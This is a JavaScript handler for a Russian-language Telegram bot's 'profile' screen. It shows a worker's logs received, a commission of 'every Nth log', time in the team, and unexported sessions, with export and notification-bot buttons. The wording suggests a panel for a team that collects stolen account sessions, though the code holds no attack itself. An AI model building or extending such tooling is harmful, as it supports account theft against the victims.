import { bot } from "../../index.js";
import Database from "../../../database/index.js";
import Commission from "../../../database/schemas/commission.js";
import Log from "../../../database/schemas/log.js";
import { declineDays } from "../../../utils/index.js";
import config from '../../../../config.json' assert {type: 'json'};
import TelegramBot from "node-telegram-bot-api";

export default {
    name: "profile",

    async exec(query) {
        const [
            user,
            logsUser,
            commissionDoc,
            unexportedLogsCount,
            notifyBot
        ] = await Promise.all([
            Database.getUser(query.from.id),
            Database.getLogsSummary(query.from.id),
            Commission.findOne({}, { value: 1 }).lean(),
            Log.countDocuments({
                worker: query.from.id,
                exported: false,
                bot: { $ne: 'com' }
            }),
            new TelegramBot(config.notify_token, { polling: false }).getMe()
        ]);

        const registeredDays = Math.floor((Date.now() - user.reg) / (1000 * 60 * 60 * 24));
        const registered = declineDays(registeredDays);

        await bot.editMessageCaption(query, `*💻 Личный кабинет*

*🆔 Ваш ID:* \`${query.from.id}\`
*🧾 Комиссия:* \`Каждый ${user.com || commissionDoc.value} лог\`

>*📊 Получено логов:* 
>За сегодня: ${logsUser.d}
>За месяц: ${logsUser.m}
>За всё время: ${logsUser.all}


*📆 В команде:* \`${registered}\`
*📁 Общее количество не выгруженных сессий:* \`${unexportedLogsCount}\``, {
            parse_mode: 'MarkdownV2',
            message_id: query.message.message_id,
            chat_id: query.message.chat.id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '📩 Выгрузить',
                            callback_data: `export:${query.from.id}`
                        },
                        {
                            text: '🔔 Отстук',
                            url: `https://t.me/${notifyBot.username}`
                        }
                    ],
                    [
                        {
                            text: '📊 Отчет дня 🟢',
                            callback_data: `export:${query.from.id}`
                        },

                    ],
                    [
                        {
                            text: '🔙 Назад',
                            callback_data: 'start'
                        }
                    ]
                ]
            }
        }, 'cdn/profile.png');
    }
}
